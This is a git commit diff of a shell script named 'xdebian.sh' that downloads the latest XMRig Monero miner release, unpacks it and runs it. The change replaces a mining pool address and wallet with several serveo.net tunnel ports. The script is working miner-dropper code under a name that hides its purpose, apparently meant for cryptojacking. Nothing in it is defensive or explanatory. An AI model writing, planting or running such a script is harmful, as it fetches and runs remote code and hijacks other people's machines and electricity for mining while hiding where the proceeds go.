27597a25950f7f03554c3e4e8fe337328d4d6bf7
polambakhaz <49311772+polambakhaz@users.noreply.github.com>
2019-04-16 22:07:54 +0300

    Update xdebian.sh

--- scripts/xdebian.sh
+++ scripts/xdebian.sh
@@ -1,5 +1,7 @@
+#!/bin/sh
+
 curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "xmrig.*tar.gz" | cut -d : -f 2,3 | tr -d \" | wget -qi  - -O xm.tar.gz
 mkdir xm
 tar xvf xm.tar.gz -C xm --strip-components=1
 chmod +x ./xm/xmrig
-./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 -o pool.supportxmr.com:443 --tls -u 86x4EkchvMLLZcL16bG25rJCRRukq5MYyT1fhUq2bAFP1fD9hLVCgNY8tC3wknFVW9BPsv6xSJWBa8ofyscqLe1j7xvg9Uz -p work -k -o pool.supportxmr.com:3333  -u 86x4EkchvMLLZcL16bG25rJCRRukq5MYyT1fhUq2bAFP1fD9hLVCgNY8tC3wknFVW9BPsv6xSJWBa8ofyscqLe1j7xvg9Uz -p work1 -k
+./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 -o serveo.net:44444 --nicehash -o serveo.net:33333 --nicehash -o serveo.net:22222 --nicehash -o serveo.net:11111 --nicehash
